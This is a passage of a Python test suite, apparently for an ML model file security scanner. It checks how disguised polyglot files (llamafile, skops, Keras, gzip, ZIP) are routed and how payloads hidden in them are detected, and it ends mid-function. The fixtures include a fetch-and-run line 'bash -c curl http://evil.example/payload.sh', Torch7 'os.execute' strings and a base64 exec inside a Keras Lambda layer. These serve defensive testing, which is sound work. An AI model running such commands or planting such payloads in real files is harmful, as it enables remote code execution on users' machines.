    metadata = audit_result.file_metadata[str(model_path)]

    assert "keras_h5" in audit_result.scanner_names
    assert "keras_h5_scan_failed" in metadata["scan_outcome_reasons"]
    assert any(check.name == "Keras H5 File Scan" for check in audit_result.checks)
    assert determine_exit_code(audit_result) == 2


def test_scan_directory_preserves_hdf5_userblock_under_skipped_suffix(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    disguised_hdf5 = tmp_path / "weights.txt"
    disguised_hdf5.write_bytes(b"benign user block")
    _append_hdf5_userblock_candidate(disguised_hdf5, plausible=True)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    audit_result = scan_model_directory_or_file(str(tmp_path), cache_enabled=False)
    metadata = audit_result.file_metadata[str(disguised_hdf5)]

    assert "keras_h5" in audit_result.scanner_names
    assert "keras_h5_h5py_unavailable" in metadata["scan_outcome_reasons"]
    assert determine_exit_code(audit_result) == 2


def test_scan_file_keeps_malformed_hdf5_zip_near_match_on_zip_route(tmp_path: Path) -> None:
    near_match = tmp_path / "zip-near-match.h5"
    _create_misnamed_zip(near_match, {"README.txt": b"benign archive"})
    _append_hdf5_userblock_candidate(near_match, plausible=False)

    assert file_detection.detect_file_format(str(near_match)) == "zip"
    assert find_hdf5_signature_offset(str(near_match)) is None

    result = scan_file(str(near_match), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert not any(check.name == "H5PY Library Check" for check in result.checks)


def test_scan_file_prefers_hdf5_and_preserves_safetensors_userblock_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "safetensors-userblock.safetensors"
    signature_offset = _write_safetensors_hdf5_userblock_candidate(polyglot, plausible=True)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    assert file_detection.detect_file_format(str(polyglot)) == "safetensors"
    assert find_hdf5_signature_offset(str(polyglot)) == signature_offset

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "keras_h5"
    assert result.success is False
    assert "keras_h5_h5py_unavailable" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["supplemental_scanners"] == ["safetensors"]
    assert any(check.name == "H5PY Library Check" for check in result.checks)
    assert any(
        check.name == "Header Length Validation" and check.status == CheckStatus.PASSED for check in result.checks
    )


def test_nested_scan_prefers_hdf5_and_preserves_safetensors_userblock_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "nested-safetensors-userblock.safetensors"
    _write_safetensors_hdf5_userblock_candidate(polyglot, plausible=True)
    monkeypatch.setattr("modelaudit.scanners.keras_h5_scanner.HAS_H5PY", False)

    result = archive_dispatch.scan_nested_file(
        str(polyglot),
        config={"cache_scan_results": False, "_archive_depth": 1},
    )

    assert result.scanner_name == "keras_h5"
    assert result.success is False
    assert "keras_h5_h5py_unavailable" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["supplemental_scanners"] == ["safetensors"]
    assert any(check.name == "H5PY Library Check" for check in result.checks)
    assert any(
        check.name == "Header Length Validation" and check.status == CheckStatus.PASSED for check in result.checks
    )


def test_scan_file_keeps_malformed_hdf5_safetensors_near_match_on_safetensors_route(tmp_path: Path) -> None:
    near_match = tmp_path / "safetensors-near-match.safetensors"
    _write_safetensors_hdf5_userblock_candidate(near_match, plausible=False)

    assert file_detection.detect_file_format(str(near_match)) == "safetensors"
    assert find_hdf5_signature_offset(str(near_match)) is None

    result = scan_file(str(near_match), config={"cache_scan_results": False})

    assert result.scanner_name == "safetensors"
    assert result.success is True
    assert "supplemental_scanners" not in result.metadata
    assert not any(check.name == "H5PY Library Check" for check in result.checks)


def test_scan_file_does_not_repeat_safetensors_analysis_when_hdf5_scanner_is_suppressed(tmp_path: Path) -> None:
    polyglot = tmp_path / "selected-safetensors-userblock.safetensors"
    _write_safetensors_hdf5_userblock_candidate(polyglot, plausible=True)

    result = scan_file(
        str(polyglot),
        config={"scanners": ["safetensors"], "cache_scan_results": False},
    )

    assert result.scanner_name == "safetensors"
    assert "supplemental_scanners" not in result.metadata
    assert sum(check.name == "Header Length Validation" for check in result.checks) == 1
    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "keras_h5"
        for check in result.checks
    )


def test_scan_directory_preserves_parseable_prefixed_zip_with_central_directory_stub(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_misnamed_zip(disguised_zip, {"payload.pkl": _build_malicious_pickle()})
    _prepend_stub(disguised_zip, b"PK\x01\x02stub-prefix")

    result = scan_model_directory_or_file(str(tmp_path))

    assert any(scanner_name == "zip" for scanner_name in result.scanner_names)
    assert any(
        issue.rule_code == "S201" and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    )


@pytest.mark.parametrize("stub", [b"\x7fELF" + b"\x00" * 60, b"MZ" + b"\x00" * 62])
def test_scan_file_preserves_zip_findings_in_llamafile_polyglot(tmp_path: Path, stub: bytes) -> None:
    polyglot = tmp_path / "payload.jpg"
    _create_misnamed_zip(polyglot, {"payload.pkl": _build_malicious_pickle()})
    _prepend_stub(polyglot, stub + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    _assert_system_pickle_detected(result, "payload.pkl")


@pytest.mark.parametrize(
    ("runtime_padding", "torch7_payload"),
    [
        (
            b"",
            b"4\n1\n3\nV 1\n13\nnn.Sequential\n4\n2\n3\nV 1\n17\ntorch.FloatTensor\ncmd = os.execute('id')\n",
        ),
        (b"", b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"),
        (
            b"A" * (64 * 1024),
            b"4\n1\n3\nV 1\n17\ntorch.FloatTensor\ncmd = os.execute('id')\n",
        ),
        (b"GGUFnot-a-valid-model", b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"),
    ],
    ids=["ascii", "binary", "late-ascii-no-boundary", "decoy-gguf-before-binary"],
)
def test_scan_file_preserves_torch7_findings_in_llamafile_polyglot(
    tmp_path: Path,
    runtime_padding: bytes,
    torch7_payload: bytes,
) -> None:
    polyglot = tmp_path / "payload.jpg"
    polyglot.write_bytes(
        b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n" + runtime_padding + torch7_payload
    )

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    assert any(
        check.name == "Torch7 Lua Execution Primitive Analysis"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.WARNING
        for check in result.checks
    )


def test_scan_file_does_not_merge_torch7_for_llamafile_text_near_match(tmp_path: Path) -> None:
    executable = tmp_path / "payload.jpg"
    executable.write_bytes(
        b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime includes torch tensor metadata\n"
    )

    result = scan_file(str(executable), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


def test_scan_file_does_not_merge_torch7_for_llamafile_magic_only_marker(tmp_path: Path) -> None:
    executable = tmp_path / "payload.jpg"
    executable.write_bytes(
        b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n" + b"T7\x00\x00" + (b"A" * 8192)
    )

    result = scan_file(str(executable), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    assert result.metadata.get("scan_outcome") != INCONCLUSIVE_SCAN_OUTCOME
    assert "embedded_torch7_offset" not in result.metadata
    assert not any(check.name.startswith("Torch7 ") for check in result.checks)


@pytest.mark.parametrize("container_kind", ["pytorch", "executorch", "skops"])
def test_scan_file_preserves_subtype_zip_findings_in_llamafile_polyglot(
    tmp_path: Path,
    container_kind: str,
) -> None:
    polyglot = tmp_path / f"{container_kind}.jpg"
    pickle_member = "payload.pkl"
    entries: dict[str, bytes]
    if container_kind == "pytorch":
        pickle_member = "data.pkl"
        entries = {pickle_member: _build_malicious_pickle(), "version": b"1.6"}
    elif container_kind == "executorch":
        pickle_member = "bytecode.pkl"
        entries = {pickle_member: _build_malicious_pickle(), "version": b"1"}
    else:
        entries = {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            pickle_member: _build_malicious_pickle(),
        }
    _create_misnamed_zip(polyglot, entries)
    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    _assert_system_pickle_detected(result, pickle_member)
    if container_kind == "skops":
        assert len([issue for issue in result.issues if issue.rule_code == "S201"]) == 1


def test_scan_file_preserves_skops_cve_findings_in_llamafile_polyglot(tmp_path: Path) -> None:
    polyglot = tmp_path / "skops-cve.jpg"
    _create_misnamed_zip(polyglot, {"schema.json": _build_malicious_skops_schema()})
    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_keeps_unreadable_skops_member_inconclusive_in_llamafile_polyglot(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    polyglot = tmp_path / "skops-unreadable.jpg"
    _create_misnamed_zip(
        polyglot,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "README.md": b"ordinary documentation",
        },
    )
    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")

    original_open = zipfile.ZipFile.open

    def open_with_failure(
        archive: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        mode: str = "r",
        pwd: bytes | None = None,
        *,
        force_zip64: bool = False,
    ) -> Any:
        if isinstance(name, zipfile.ZipInfo) and name.filename == "README.md":
            raise zipfile.BadZipFile("CRC mismatch")
        return original_open(archive, name, mode, pwd, force_zip64=force_zip64)

    monkeypatch.setattr(zipfile.ZipFile, "open", open_with_failure)

    result = scan_model_directory_or_file(str(polyglot), cache_enabled=False)

    metadata = result.file_metadata[str(polyglot)]
    assert "skops_zip_entry_read_failed" in metadata["scan_outcome_reasons"]
    assert "_known_unreadable_archive_entry_offsets" not in metadata
    assert not any("Error scanning ZIP entry README.md" in issue.message for issue in result.issues)
    assert core_module.determine_exit_code(result) == 2


def test_scan_file_preserves_skops_cve_findings_in_out_of_window_executable_zip(tmp_path: Path) -> None:
    polyglot = tmp_path / "skops-late-marker.jpg"
    _create_misnamed_zip(polyglot, {"schema.json": _build_malicious_skops_schema()})
    _prepend_stub(
        polyglot,
        b"\x7fELF"
        + b"\x00" * 60
        + b"A" * LLAMAFILE_ROUTE_SCAN_BYTES
        + b"llamafile runtime"
        + b"B" * LLAMAFILE_ROUTE_TAIL_SCAN_BYTES,
    )

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "zip"
    assert any(
        check.name == "CVE-2025-54412 Detection" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_benign_llamafile_zip_polyglot_has_no_high_severity(tmp_path: Path) -> None:
    polyglot = tmp_path / "safe.jpg"
    _create_misnamed_zip(polyglot, {"payload.pkl": pickle.dumps({"safe": True})})
    _prepend_stub(polyglot, b"\x7fELF" + b"\x00" * 60 + b"llamafile runtime\n")

    result = scan_file(str(polyglot), config={"cache_scan_results": False})

    assert result.scanner_name == "llamafile"
    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)


def test_scan_file_fails_closed_when_disguised_llamafile_route_probe_cannot_read(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = tmp_path / "payload.jpg"
    payload.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    def raise_os_error(_path: Path, _marker: bytes, _limit: int) -> bool:
        raise OSError("synthetic marker probe failure")

    monkeypatch.setattr("modelaudit.utils.file.detection._contains_casefolded_marker_in_prefix", raise_os_error)

    result = scan_file(str(payload), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "llamafile_routing_incomplete"
    check = next(check for check in result.checks if check.name == "Llamafile Routing")
    assert "bounded marker bytes could not be read" in check.message

    aggregate = scan_model_directory_or_file(str(payload), cache_scan_results=False)
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_model_omits_phase_timings_by_default(tmp_path: Path) -> None:
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))

    result = scan_model_directory_or_file(str(payload), cache_scan_results=False)

    assert not hasattr(result, "phase_timings")


def test_scan_model_emits_opt_in_phase_timings(tmp_path: Path) -> None:
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(pickle.dumps({"weights": [1, 2, 3]}))

    result = scan_model_directory_or_file(str(payload), cache_scan_results=False, profile_timings=True)
    phase_timings = result.phase_timings  # type: ignore[attr-defined]

    assert phase_timings.keys() >= {
        "scanner_selection",
        "top_level_hashing",
        "file_scan_dispatch",
        "result_merge",
        "license_metadata",
        "result_consolidation",
        "commercial_use_warnings",
        "aggregate_hash",
    }
    assert all(duration >= 0 for duration in phase_timings.values())


def test_scan_file_detects_misnamed_gzip_wrapped_pickle_by_header(tmp_path: Path) -> None:
    disguised_gzip = tmp_path / "payload.jpg"
    disguised_gzip.write_bytes(gzip.compress(_build_malicious_pickle()))

    result = scan_file(str(disguised_gzip))

    assert result.scanner_name == "compressed"
    routing_checks = [check for check in result.checks if check.name == "Compressed Wrapper Inner Scanner Routing"]
    assert routing_checks
    assert routing_checks[0].details.get("inner_scanner") == "pickle"
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("compressed_wrapper") == f"{disguised_gzip} -> payload.jpg.inner"
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), f"Expected compressed inner pickle finding, got: {[(i.location, i.message, i.details) for i in result.issues]}"


def test_scan_file_detects_late_pickle_in_misnamed_concatenated_gzip(tmp_path: Path) -> None:
    disguised_gzip = tmp_path / "payload.jpg"
    disguised_gzip.write_bytes(gzip.compress(b"harmless prelude\n") + gzip.compress(_build_malicious_pickle()))

    result = scan_file(str(disguised_gzip))

    assert result.scanner_name == "compressed"
    assert result.metadata["compressed_member_count"] == 2
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("compressed_wrapper") == f"{disguised_gzip} -> payload.jpg.inner#member-2"
        and any(global_name in issue.message.lower() for global_name in _SYSTEM_GLOBAL_NAMES)
        for issue in result.issues
    ), (
        "Expected late compressed-member pickle finding, got: "
        f"{[(i.location, i.message, i.details) for i in result.issues]}"
    )


def test_scan_file_does_not_route_compression_magic_near_match_to_compressed(tmp_path: Path) -> None:
    near_match = tmp_path / "payload.jpg"
    near_match.write_bytes(b"\x1f\x00not-a-gzip-stream")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert not [check for check in result.checks if check.name.startswith("Compressed Wrapper")]
    assert result.issues == []


def test_scan_file_does_not_route_pk_prefix_near_match_to_zip(tmp_path: Path) -> None:
    near_match = tmp_path / "payload.jpg"
    near_match.write_bytes(b"PKNO harmless text")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert not [check for check in result.checks if "ZIP" in check.name]
    assert result.issues == []


def test_scan_file_detects_shadowed_duplicate_pickle_in_misleading_zip(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "payload.jpg"
    _create_zip_with_ordered_entries(
        disguised_zip,
        [
            ("payload.pkl", _build_malicious_pickle()),
            ("payload.pkl", pickle.dumps({"safe": True})),
        ],
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_detects_malicious_payload_in_skops_via_zip_pipeline(tmp_path: Path) -> None:
    skops_archive = tmp_path / "payload.skops"
    _create_misnamed_zip(skops_archive, {"payload.pkl": _build_malicious_pickle()})

    result = scan_file(str(skops_archive))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_skops_archive_by_schema_content(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "payload.jpg"
    _create_misnamed_zip(
        disguised_skops,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_routes_misnamed_skops_archive_by_bare_schema_content(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "payload-no-ext-schema.jpg"
    _create_misnamed_zip(
        disguised_skops,
        {
            "nested/schema": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.11.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_does_not_route_nested_bare_schema_near_match_to_skops(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "nested-schema-near-match.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "nested/schema": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any("CVE-2025-" in check.name for check in result.checks)


def test_scan_file_does_not_route_near_match_schema_zip_to_skops(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "schema.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any("CVE-2025-" in check.name for check in result.checks)


def test_scan_file_routes_oversized_misnamed_skops_schema_to_skops(tmp_path: Path) -> None:
    disguised_skops = tmp_path / "oversized-schema.jpg"
    schema = {
        "__class__": "Pipeline",
        "__module__": "sklearn.pipeline",
        "__loader__": "ObjectNode",
        "_skops_version": "0.11.0",
        "content": {},
        "padding": "x" * (4 * 1024 * 1024),
    }
    _create_misnamed_zip(
        disguised_skops,
        {
            "schema.json": json.dumps(schema).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_skops))

    assert result.scanner_name == "skops"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_handles_encrypted_skops_schema_without_routing_crash(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "encrypted-schema.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ).encode("utf-8"),
        },
    )
    _mark_zip_entries_encrypted(disguised_zip)

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert any("encrypted" in check.message.lower() for check in result.checks)


def test_scan_file_scans_clean_skops_without_nested_false_positives(tmp_path: Path) -> None:
    skops_archive = tmp_path / "clean.skops"
    _create_misnamed_zip(
        skops_archive,
        {
            "schema.json": json.dumps(
                {
                    "__class__": "Pipeline",
                    "__module__": "sklearn.pipeline",
                    "__loader__": "ObjectNode",
                    "_skops_version": "0.12.0",
                    "content": {},
                }
            ).encode("utf-8"),
            "metadata.json": b'{"name": "clean_model"}',
            "weights.bin": b"model weights",
        },
    )

    result = scan_file(str(skops_archive))

    assert result.scanner_name == "skops"
    assert result.success
    assert not result.issues


def test_scan_file_does_not_route_generic_zip_config_to_keras(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "repo.jpg"
    _create_misnamed_zip(disguised_zip, {"config.json": json.dumps({"model_type": "bert"}).encode("utf-8")})

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any(check.name.startswith("Keras ZIP") for check in result.checks)


def test_scan_file_routes_misnamed_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
    }
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps(config).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_routes_misnamed_config_only_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
    }
    _create_misnamed_zip(disguised_keras, {"config.json": json.dumps(config).encode("utf-8")})

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


@pytest.mark.parametrize("filename", ["model.jpg", "model.keras"])
def test_scan_file_fails_closed_when_content_routed_keras_zip_scanner_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
) -> None:
    disguised_keras = tmp_path / filename
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    original_load_scanner = core_module._registry._load_scanner

    def load_scanner(scanner_id: str) -> type[Any] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)

    reset_cache_manager()
    try:
        result = scan_file(str(disguised_keras), config=config)
        repeated = scan_file(str(disguised_keras), config=config)

        assert repeated.success is False
        assert repeated.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    assert result.scanner_name == "zip"
    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]
    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.details["format"] == "keras_zip"
    assert check.details["preferred_scanner_id"] == "keras_zip"

    aggregate = scan_model_directory_or_file(str(disguised_keras), cache_scan_results=False)
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_bypasses_stale_cache_when_keras_zip_scanner_becomes_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    original_load_scanner = core_module._registry._load_scanner
    keras_scanner_available = True

    def load_scanner(scanner_id: str) -> type[Any] | None:
        if scanner_id == "keras_zip" and not keras_scanner_available:
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)

    reset_cache_manager()
    try:
        cached = scan_file(str(disguised_keras), config=config)
        assert cached.success is True
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0

        keras_scanner_available = False
        unavailable = scan_file(str(disguised_keras), config=config)
    finally:
        reset_cache_manager()

    assert unavailable.scanner_name == "zip"
    assert unavailable.success is False
    assert unavailable.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"


def test_scan_file_bypasses_stale_cache_when_pytorch_zip_scanner_becomes_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    original_load_scanner = core_module._registry._load_scanner
    pytorch_scanner_available = True

    def load_scanner(scanner_id: str) -> type[Any] | None:
        if scanner_id == "pytorch_zip" and not pytorch_scanner_available:
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)

    reset_cache_manager()
    try:
        cached = scan_file(str(model_path), config=config)
        assert cached.success is True
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0

        pytorch_scanner_available = False
        unavailable = scan_file(str(model_path), config=config)
    finally:
        reset_cache_manager()

    assert unavailable.scanner_name == "zip"
    assert unavailable.success is False
    assert unavailable.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"


def test_scan_file_bypasses_outer_archive_cache_when_nested_scanner_becomes_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    nested_keras = io.BytesIO()
    with zipfile.ZipFile(nested_keras, "w") as archive:
        archive.writestr("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}))
        archive.writestr("metadata.json", json.dumps({"keras_version": "3.0.0"}))

    outer_archive = tmp_path / "outer.zip"
    with zipfile.ZipFile(outer_archive, "w") as archive:
        archive.writestr("nested.keras", nested_keras.getvalue())

    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }
    original_load_scanner = core_module._registry._load_scanner
    keras_scanner_available = True

    def load_scanner(scanner_id: str) -> type[Any] | None:
        if scanner_id == "keras_zip" and not keras_scanner_available:
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)

    reset_cache_manager()
    try:
        cached = scan_file(str(outer_archive), config=config)
        assert cached.success is True
        assert "keras_zip" in cached.metadata["scanner_dependency_ids"]
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0

        keras_scanner_available = False
        unavailable = scan_file(str(outer_archive), config=config)
    finally:
        reset_cache_manager()

    assert unavailable.scanner_name == "zip"
    assert unavailable.success is False
    assert "zip_analysis_incomplete" in unavailable.metadata["scan_outcome_reasons"]
    nested_check = next(check for check in unavailable.checks if check.name == "Format Detection")
    assert nested_check.location == f"{outer_archive}:nested.keras"
    assert nested_check.details["preferred_scanner_id"] == "keras_zip"


def test_scan_file_disables_advanced_cache_for_unavailable_keras_fallback(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    disguised_keras = tmp_path / "model.keras"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )
    original_load_scanner = core_module._registry._load_scanner

    def load_scanner(scanner_id: str) -> type[Any] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    def scan_advanced_without_cache(
        path: str,
        scanner: ZipScanner,
        progress_callback: Any,
        timeout: int,
        *,
        allowed_shard_paths: list[str] | None = None,
        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
    ) -> ScanResult:
        assert path == str(disguised_keras)
        assert progress_callback is None
        assert timeout == 7200
        assert allowed_shard_paths is None
        assert allowed_shard_targets is None
        assert scanner.config["cache_enabled"] is False
        return scanner.scan(path)

    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)

    def always_use_advanced_handler(
        _path: str,
        *,
        allowed_shard_paths: list[str] | None = None,
        allowed_shard_targets: core_module.ValidatedShardTargets | None = None,
